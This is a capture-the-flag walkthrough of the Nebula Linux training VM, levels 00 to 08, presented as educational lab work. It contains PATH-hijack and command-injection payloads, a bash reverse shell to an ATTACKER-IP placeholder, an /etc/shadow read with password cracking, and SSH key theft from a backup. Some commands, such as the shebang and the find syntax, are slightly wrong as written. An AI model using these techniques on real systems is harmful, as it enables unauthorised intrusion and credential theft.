# Nebula Exploit Development Challenge Guide

## Welcome to the Nebula Challenge!
---
Before you dive into the Nebula challenge and explore its intricacies, it's highly recommended to read the instruction page carefully. This will provide you with valuable information, guidelines, and tips to make the most out of your Nebula experience.

**[Read the Instructions](https://sec-fortress.github.io/posts/projects/posts/instructions.html)**

## Exploring Nebula Write-ups

You're currently on the Nebula write-up page, where I'll be sharing my journey through various challenges. Here, I've categorized my experiences to help you navigate through the different aspects of the Nebula challenge. Feel free to explore and learn from my solutions and insights.

### Write-up Categories

1. [Local Exploits](#local-exploits)
2. [Privilege Escalation](#privilege-escalation)

Let's dive into the fascinating world of Nebula and uncover the vulnerabilities and solutions that lie ahead!

---

## LEVEL 00

Our First step is to import the ISO file in your Favorite VM Player and SSH into it, Make sure to choose the first option here :

![](https://i.imgur.com/6YsmyRm.png)

Login with `nebula` as username and `nebula` as password

![](https://i.imgur.com/Hzkj8bH.png)

Great, Now let SSH to **LEVEL 00** , do `ifconfig` on nebula and do `ssh level00@<ip-address>`

![](https://i.imgur.com/CL41c5F.png)

![](https://i.imgur.com/nOjD6Z2.png)

> **Objective :**  Find a Set User ID program that will run as the “flag00” account

Definitely we need the Find command to do this , we can use this syntax

```shell
find / -type f -perm -u=flag00 2>/dev/null
```

![](https://i.imgur.com/aOl30E6.png)

We can see that we have alot of SUID programs here , but the first one looks interesting, since we are looking for something related to "flag00" , which after running it leaves us with a message

![](https://i.imgur.com/1s4ac6d.png)

## LEVEL 01

Exit the previous session and login as `level01` both password and username

![](https://i.imgur.com/FSFcma3.png)

> **Objective :** There is vulnerability in a program that allows arbitrary programs to be executed, can you find it? (Refer to the instructions page to know more)

First of all we would `cd` to  **/home/flag01** since we where asked to do so and as we can see we have a "flag01" file with the SUID bit set and executable permissions

![](https://i.imgur.com/t7Bzj2s.png)

Viewing the `source-code` we can see that we have a line that allows us to run system commands :

```c
  system("/usr/bin/env echo and now what?");
```

What we can do here is either the `&&` operator or `;` followed by any other command we wish to run, something like `./flag01; /bin/bash` or `./flag01 && /bin/bash`

![](https://i.imgur.com/XxuYWZT.png)

Definitely, we did not escalate privileges as `flag01`, Since the command `/usr/bin/env` is been used to validate PATH in the executable and then the binary `echo` is ran, we can definitely use this binary to get "flag01" by creating a malicious `echo` file and then adding the location of this malicious file to our PATH Environment.

- Change Directory to /tmp since it is a world writeable folder - `cd /tmp`
- Then do open up nano saving the filename as **echo** - `nano echo`
- Add these lines to the file

```shell
!#/bin/bash

/bin/bash -p
```

- Now save it and grant it executable permissions - `chmod +x echo`

![](https://i.imgur.com/lwLyqCO.png)

- Now add /tmp to our path environment with the command

```shell
export PATH=/tmp:$PATH
```

![](https://i.imgur.com/6ArgPMC.png)

Sorry i did it twice here, you can run the command ones and we are good, Now go back to our **/home/flag01** and run the executable there again, you should be user `flag01`

![](https://i.imgur.com/JIZ9P1S.png)

## LEVEL 02

As usual we are given a C program for this too, but the vulnerable code snippet is these

```c
asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
```

this program is typically the same as the other one but with more features, this program is going to run the `/bin/echo` binary and print out the current user just like the `whoami` command, but this time it is the current user setup in the USER Environment Variable

![](https://i.imgur.com/5C7XL7w.png)

We can alter this by providing our own USER like the image below, what we did is use the `&&` operator to specify that if the first condition is true which is the `USER="sec-fortress"` then execute the second one which is `./flag02` 

![](https://i.imgur.com/fvUFakt.png)

Now we need a way to run `/bin/bash -p` , we can do this using the `#` and `;` operator whereas the hashtag comment out everything after that command in this case _is cool_ , You should obtain user **flag02** if we did it right

![](https://i.imgur.com/0MZfA1Z.png)

## LEVEL 03

We are giving a folder and an executable in the **/home/flag03** folder

![](https://i.imgur.com/N5Eil9Q.png)

In which the folder `writeable.d` has nothing inside but the `writeable.sh` file has some kind of bash script that looks for a file in the `writeable.d` directory named `*` and then run this `*` file in debug mode with `bash -x`, after the file name `*` is ran, it automatically deletes it

![](https://i.imgur.com/cQX65AY.png)

But as a **Penetration Tester** we know that before the script deletes, we would have gotten what we want, How ??

- We start by starting up a Netcat listener on port 4444 on our attacker machine - `nc -lvnp 4444`
- Then creating a file called `*` in the **writeable.d** directory - `touch *`

![](https://i.imgur.com/7dnhYjV.png)

- Then add these payload to get a reverse shell as user **flag03** into the `*` file, make sure to change ATTACKER-IP to a valid IP address:

```shell
/bin/bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

- Now grant the `*` file executable permissions and wait for the Moment of doom 😆

![](https://i.imgur.com/xsf3Ojy.png)

## LEVEL 04

We are required to read a `token` file in **/home/flag04** directory using the `flag04` binary 

![](https://i.imgur.com/zXGm0qy.png)

We can't read the file just like that because of some few filters that have been put in place, here is the C code snippet

```c
---SNIP---
if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }
  ---SNIP---
```

I then decided to create a symbolic link to this file, in our `/tmp` directory which literally gave us some random characters

![](https://i.imgur.com/4DPnF2U.png)

Then i decided to try out the random characters as the password for user `flag04` and woo it worked !!!

![](https://i.imgur.com/IhKz18i.png)

## LEVEL 05

According to the instructions **"Check the flag05 home directory. You are looking for weak directory permissions"** , We can see that .backup has a weak file permission, you can read more on it from [here](https://juggernaut-sec.com/weak-file-permissions/) 

![](https://i.imgur.com/ymaoN4Z.png)

Checking the backup folder we only have read access to the `backup-19072011.tgz` file :

![](https://i.imgur.com/lEI3hAV.png)

Checking what it does , it looks like it is trying to make a .ssh directory here then unzip the content of this backup file to it :

![](https://i.imgur.com/0PHR2jY.png)

Using this particular command i was able unpack this archive to /tmp - `tar zxvf backups.tgz -C /tmp`

![](https://i.imgur.com/ugKcqu3.png)

Navigating there we have an id_rsa key 😘, we can use this to login as user `flag05`, Successfully

![](https://i.imgur.com/AR3Xaz4.png)

## LEVEL 06

I caught this sentence **"account credentials came from a legacy unix system."** , I won't say this was easy but at least we had to bruteforce

Doing `cat /etc/passwd; cat /etc/shadow` gives us some user account information, but one looks suspicious with the `flag06` account pointing directly to an MD5 hash

![](https://i.imgur.com/nmc7TnY.png)

Brute-forcing it with the tool called `John-The-Ripper` gives us a password which seems to be the valid password of user `flag06`

![](https://i.imgur.com/z63bp9j.png)

We got `flag06`

![](https://i.imgur.com/CYHpveB.png)

## LEVEL 07

Looking at the code snippet we have a command injection vulnerability in the `Host` parameter which allows us to send ICMP echo request to an IP address and then we can inject our own arbitrary shell command along side

```shell
  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

When performing Command injection we can use the `&& ; | ||` and other special characters to perform this action, let try this out, since we know it needs the `Host` parameter we can use the `perl`command to do this

![](https://i.imgur.com/IMEJ0lH.png)

As we can see when we used `&&` operator we didn't get the id result but when we use `|` we get the result of id back. Yeah i enumerated and found out that i can use `cURL` but it isn't available on the target system

![](https://i.imgur.com/V1jQHiG.png)

An alternative is `wget` and yeah it is available, With these we can make request to the web server as if we are making an actual request in a browser.

![](https://i.imgur.com/7Y4ARQ9.png)

Using the `-O` option we can specify the output file, in this case it is `-` meaning standard output followed by the website link, the format should look like this

```shell
wget -O - http://127.0.0.1:<port>/index.cgi?Host="127.0.0.1 | id"
```

You might be wondering where `:<port>/index.cgi?Host=` came from, well inside the **/home/flag07** folder we have two files which is `index.cgi` and `thttpd.conf` , The **thttpd.conf** has some information we need like `port` , `host` and other info

```
<SNIP>
# Do el-cheapo virtual hosting. If vhost is the compiled-in default (not the
# case on Debian), then novhost disables it. See thttpd(8) for details.
#vhost
#novhost

# Use a global passwd file. This means that every file in the entire document
# tree is protected by the single .htpasswd file at the top of the tree.
# Otherwise the semantics of the .htpasswd file are the same. If this option is
# set but there is no .htpasswd file in the top-level directory, then thttpd
# proceeds as if the option was not set - first looking for a local .htpasswd
# file, and if that doesn't exist either then serving the file without any
# password. If globalpasswd is the compiled-in default (not the case on Debian),
# then noglobalpasswd disables it.
#globalpasswd
#noglobalpasswd

# Specifies what user to switch to after initialization when started as root.
user=flag07

# Specifies a wildcard pattern for CGI programs, for instance "**.cgi" or
# "/cgi-bin/*". See thttpd(8) for details.
cgipat=**.cgi

# Specifies a file of throttle settings. See thttpd(8) for details.
#throttles=/etc/thttpd/throttle.conf

# Specifies a hostname to bind to, for multihoming. The default is to bind to
# all hostnames supported on the local machine. See thttpd(8) for details.
#host=

# Specifies a file for logging. If no logfile option is specified, thttpd logs
# via syslog(). If logfile=/dev/null is specified, thttpd doesn't log at all.
#logfile=/var/log/thttpd.log

# Specifies a file to write the process-id to. If no file is specified, no
# process-id is written. You can use this file to send signals to thttpd. See
# thttpd(8) for details.
#pidfile=

# Specifies the character set to use with text MIME types.
#charset=iso-8859-1

# Specifies a P3P server privacy header to be returned with all responses. See
# http://www.w3.org/P3P/ for details. Thttpd doesn't do anything at all with the
# string except put it in the P3P: response header.
#p3p=

# Specifies the number of seconds to be used in a "Cache-Control: max-age"
# header to be returned with all responses. An equivalent "Expires" header is
# also generated. The default is no Cache-Control or Expires headers, which is
# just fine for most sites.
#max_age=
```

Therefore we can do `wget -O - http://127.0.0.1:7007/index.cgi?Host="127.0.0.1 | id"` , Giving us an id for flag07, This means we can execute command as **flag07**

![](https://i.imgur.com/1ClgbHN.png)

we can now do the `getflag` command

![](https://i.imgur.com/g2tAk4r.png)

## LEVEL 08

We have a `capture.pcap` file in the **/home/flag08** directory, we can send this file to our attacker system and inspect it with **wireshark** 

![](https://i.imgur.com/XLgE2JG.png)

We can send it using python the **SimpleHTTPServer** library on port 9999 

![](https://i.imgur.com/WJClDAb.png)

Open the **wireshark** application and click `File` then `Open`

![](https://i.imgur.com/QVTtJWg.png)

Locate your **pcap** file wherever it was saved and **Double-click** it to `open`, You should now see  bunch of packets

![](https://i.imgur.com/MjBl4eF.png)

![](https://i.imgur.com/7M2pUIX.png)

Right-Click on any of this **Packets** and click Follow>>TCP Stream

![](https://i.imgur.com/pGnbwhm.png)

We now have a `Password` in the new tab opened

![](https://i.imgur.com/KxJFNK9.png)

After several trials , i found out the password is `backd00Rmate`

![](https://i.imgur.com/ttMCQVO.png)

---

Remember, to get started, **[read the instructions](https://sec-fortress.github.io/posts/projects/posts/instructions.html)** to ensure you're well-prepared for the Nebula challenge. Happy exploring and learning!

# Thank You for Joining the Nebula Challenge Journey!

As I wrap up this series of Nebula exploit development challenge write-ups, I want to extend my heartfelt gratitude to each and every one of you who embarked on this journey with me. Your curiosity, dedication, and passion for cybersecurity are truly inspiring.

Exploring the intricacies of Linux vulnerabilities and exploit development through Nebula has been an incredible experience. It's through challenges like these that we continue to learn, grow, and strengthen our skills in the ever-evolving landscape of cybersecurity.

I hope that my write-ups have provided insights, strategies, and a deeper understanding of the fascinating world of security exploits. Remember, these write-ups are just a snapshot of what's possible, and I encourage you to explore, experiment, and take your learning even further.

Thank you for your engagement, your feedback, and your enthusiasm. The journey doesn't end here—there's always more to discover, more to learn, and more challenges to conquer.

As you move forward in your own cybersecurity endeavors, may you find success, excitement, and a sense of accomplishment in every step you take. Keep pushing boundaries, keep learning, and keep making the digital world a safer place.

Stay curious, stay determined, and keep challenging the status quo.

With sincere gratitude,
[Sec-Fortress]

